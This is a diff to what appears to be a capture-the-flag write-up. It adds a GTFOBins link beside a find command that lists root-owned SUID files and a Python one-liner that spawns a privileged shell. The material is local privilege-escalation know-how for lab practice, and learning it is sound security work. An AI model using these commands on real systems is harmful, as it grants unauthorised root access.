@@ -71,7 +71,7 @@ find / -type f -user root -perm -u=s 2>/dev/null
 ```
 pretty much what it does is it search for all **SUID (Set User ID)** files owned by the **root** user, and we got the 6th question answer here.
 
-also now i search about how to privilege escalate by the SUDI, and got by the python script :   
+also now i search about how to privilege escalate by the SUDI, and got [here](https://gtfobins.org/gtfobins/python/) this python script :   
 ```python
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
